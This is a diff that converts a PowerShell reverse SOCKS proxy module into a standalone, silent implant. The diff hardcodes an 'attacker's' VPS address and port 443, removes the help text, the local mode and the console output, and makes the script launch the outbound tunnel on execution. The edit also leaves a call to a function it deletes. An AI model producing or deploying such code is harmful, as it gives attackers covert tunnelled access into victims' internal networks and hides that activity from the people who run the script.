@@ -1,50 +1,12 @@
-<#
-.SYNOPSIS
+# attacker's hardcoded vps address
+$vps = "192.168.56.102"
 
-Powershell Socks Proxy
- 
-Author: p3nt4 (https://twitter.com/xP3nt4)
-License: MIT
- 
-.DESCRIPTION
- 
-Creates a local or "reverse" Socks proxy using powershell.
- 
-Supports both Socks4 and Socks5 connections.
-This is only a subset of the Socks 4 and 5 protocols: It does not support authentication, It does not support UDP or bind requests.
- 
-New features will be implemented in the future. PRs are welcome.
- 
- .EXAMPLE_LOCAL
- 
-# Create a Socks proxy on port 1234:
-Invoke-SocksProxy -bindPort 1234
-# Change the number of threads from 200 to 400:
-Invoke-SocksProxy -bindPort 1234 -threads 400
+# attacker's listening port
+$listenPort = 443
 
- .EXAMPLE_REVERSE
- 
-# On the remote host: 
-# Generate a private key and self signed cert
-openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem
-# Get the certificate fingerprint to verify it:
-openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d "=" -f 2 | tr -d ":"
-# Start the handler
-python ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key
+# optional argument for validating the attacker's sha1 fingerprint
+# $certFingerprint = ""
 
-# On the local host:
-Import-Module .\Invoke-SocksProxy.psm1
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 
-# Go through the system proxy:
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy
-# Validate certificate
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -certFingerprint '93061FDB30D69A435ACF96430744C5CC5473D44E'
-# Give up after a number of failed connections to the handler:
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -maxRetries 10
-#>
- 
- 
- 
 [ScriptBlock]$SocksConnectionMgr = {
     param($vars)
     $Script = {
@@ -121,12 +83,12 @@ Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -maxRetries 
                 $buffer[5]=0
                 $cliStream.Write($buffer,0,10)
                 $cliStream.Flush()
-                $srvStream = $tmpServ.GetStream() 
+                $srvStream = $tmpServ.GetStream()
                 $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                 $AsyncJobResult = $cliStream.CopyToAsync($srvStream)
                 $AsyncJobResult.AsyncWaitHandle.WaitOne();
                 $AsyncJobResult2.AsyncWaitHandle.WaitOne();
-                
+
             }
             else{
                 $buffer[1]=4
@@ -151,7 +113,7 @@ Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -maxRetries 
                 $cliStream.Read($buffer,0,1)
             }
             $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort)
-            
+
             if($tmpServ.Connected){
                 $buffer[0]=0
                 $buffer[1]=90
@@ -159,7 +121,7 @@ Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -maxRetries 
                 $buffer[3]=0
                 $cliStream.Write($buffer,0,8)
                 $cliStream.Flush()
-                $srvStream = $tmpServ.GetStream() 
+                $srvStream = $tmpServ.GetStream()
                 $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                 $AsyncJobResult = $cliStream.CopyTo($srvStream)
                 $AsyncJobResult.AsyncWaitHandle.WaitOne();
@@ -182,95 +144,9 @@ Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -maxRetries 
         Exit;
     }
 }
- 
 
-function Invoke-SocksProxy{
-    param (
- 
-            [String]$bindIP = "0.0.0.0",
- 
-            [Int]$bindPort = 1080,
-
-            [Int]$threads = 200
- 
-     )
-    try{
-        $listener = new-object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($bindIP), $bindPort)
-        $listener.start()
-        $rsp = [runspacefactory]::CreateRunspacePool(1,$threads);
-        $rsp.CleanupInterval = New-TimeSpan -Seconds 30;
-        $rsp.open();
-        write-host "Listening on port $bindPort..."
-        while($true){
-            $client = $listener.AcceptTcpClient()
-            $cliStream = $client.GetStream()
-            Write-Host "New Connection from " $client.Client.RemoteEndPoint
-            $vars = [PSCustomObject]@{"cliConnection"=$client; "rsp"=$rsp; "cliStream" = $cliStream}
-            $PS3 = [PowerShell]::Create()
-            $PS3.RunspacePool = $rsp;
-            $PS3.AddScript($SocksConnectionMgr).AddArgument($vars) | Out-Null
-            $PS3.BeginInvoke() | Out-Null
-            Write-Host "Threads Left:" $rsp.GetAvailableRunspaces()
-        }
-     }
-    catch{
-        throw $_
-    }
-    finally{
-        write-host "Server closed."
-        if ($listener -ne $null) {
-                  $listener.Stop()
-           }
-        if ($client -ne $null) {
-            $client.Dispose()
-            $client = $null
-        }
-        if ($PS3 -ne $null -and $AsyncJobResult3 -ne $null) {
-            $PS3.EndInvoke($AsyncJobResult3) | Out-Null
-            $PS3.Runspace.Close()
-            $PS3.Dispose()
-        }
-    }
-}
-
-# Credit to Arno0x for this technique
-function getProxyConnection{
-
-    param (
- 
-            [String]$remoteHost,
- 
-            [Int]$remotePort
-
-     )
-    #Sleep -Milliseconds 500
-    $request = [System.Net.HttpWebRequest]::Create("http://" + $remoteHost + ":" + $remotePort ) 
-    $request.Method = "CONNECT";
-    $proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-    $proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
-    $request.Proxy = $proxy;
-    $request.timeout = 1000;
-    $serverResponse = $request.GetResponse();
-    $request.timeout = 100000;
-    $responseStream = $serverResponse.GetResponseStream()
-    $BindingFlags= [Reflection.BindingFlags] "NonPublic,Instance"
-    $rsType = $responseStream.GetType()
-    $connectionProperty = $rsType.GetProperty("Connection", $BindingFlags)
-    $connection = $connectionProperty.GetValue($responseStream, $null)
-    $connectionType = $connection.GetType()
-    $networkStreamProperty = $connectionType.GetProperty("NetworkStream", $BindingFlags)
-    $serverStream = $networkStreamProperty.GetValue($connection, $null)
-    return $connection, $serverStream
-}
-
-
-## EXPERIMENTAL.....
 function Invoke-ReverseSocksProxy{
     param (
- 
-            [String]$remoteHost = "127.0.0.1",
- 
-            [Int]$remotePort = 1080,
 
             [Switch]$useSystemProxy = $false,
 
@@ -287,13 +163,12 @@ function Invoke-ReverseSocksProxy{
         $rsp.CleanupInterval = New-TimeSpan -Seconds 30;
         $rsp.open();
         while($true){
-            Write-Host "Connecting to: " $remoteHost ":" $remotePort
             try{
                 if($useSystemProxy -eq $false){
-                        $client = New-Object System.Net.Sockets.TcpClient($remoteHost, $remotePort)
+                        $client = New-Object System.Net.Sockets.TcpClient($vps, $listenPort)
                         $cliStream_clear = $client.GetStream()
                     }else{
-                        $ret = getProxyConnection -remoteHost $remoteHost -remotePort $remotePort
+                        $ret = getProxyConnection -vps $vps -listenPort $listenPort
                         $client = $ret[0]
                         $cliStream_clear = $ret[1]
                 }
@@ -302,12 +177,11 @@ function Invoke-ReverseSocksProxy{
                 }else{
                     $cliStream = New-Object System.Net.Security.SslStream($cliStream_clear,$false,({return $args[1].GetCertHashString() -eq $certFingerprint } -as[Net.Security.RemoteCertificateValidationCallback]));
                 }
-                $cliStream.AuthenticateAsClient($remoteHost)
-                Write-Host "Connected"
+                $cliStream.AuthenticateAsClient($vps)
                 $currentTry = 0;
                 $buffer = New-Object System.Byte[] 32
                 $buffer2 = New-Object System.Byte[] 122
-                $FakeRequest = [System.Text.Encoding]::Default.GetBytes("GET / HTTP/1.1`nHost: "+$remoteHost+"`n`n")
+                $FakeRequest = [System.Text.Encoding]::Default.GetBytes("GET / HTTP/1.1`nHost: "+$vps+"`n`n")
                 $cliStream.Write($FakeRequest,0,$FakeRequest.Length)
                 $cliStream.ReadTimeout = 5000
                 $cliStream.Read($buffer2,0,122) | Out-Null
@@ -315,8 +189,6 @@ function Invoke-ReverseSocksProxy{
                 $message = [System.Text.Encoding]::ASCII.GetString($buffer)
                 if($message -ne "HELLO"){
                     throw "No Client connected";
-                }else{
-                    Write-Host "Connection received"
                 }
                 $cliStream.ReadTimeout = 100000;
                 $vars = [PSCustomObject]@{"cliConnection"=$client; "rsp"=$rsp; "cliStream" = $cliStream}
@@ -324,7 +196,6 @@ function Invoke-ReverseSocksProxy{
                 $PS3.RunspacePool = $rsp;
                 $PS3.AddScript($SocksConnectionMgr).AddArgument($vars) | Out-Null
                 $PS3.BeginInvoke() | Out-Null
-                Write-Host "Threads Left:" $rsp.GetAvailableRunspaces()
             }catch{
                 $currentTry = $currentTry + 1;
                 if (($maxRetries -ne 0) -and ($currentTry -eq $maxRetries)){
@@ -352,7 +223,6 @@ function Invoke-ReverseSocksProxy{
         throw $_;
     }
     finally{
-        write-host "Server closed."
         if ($client -ne $null) {
             $client.Dispose()
             $client = $null
@@ -364,19 +234,5 @@ function Invoke-ReverseSocksProxy{
         }
     }
 }
- 
 
-
-function Get-IpAddress{
-    param($ip)
-    IF ($ip -as [ipaddress]){
-        return $ip
-    }else{
-        $ip2 = [System.Net.Dns]::GetHostAddresses($ip)[0].IPAddressToString;
-        Write-Host "$ip resolved to $ip2"
-    }
-    return $ip2
-}
-
-export-modulemember -function Invoke-SocksProxy
-export-modulemember -function Invoke-ReverseSocksProxy
+Invoke-ReverseSocksProxy
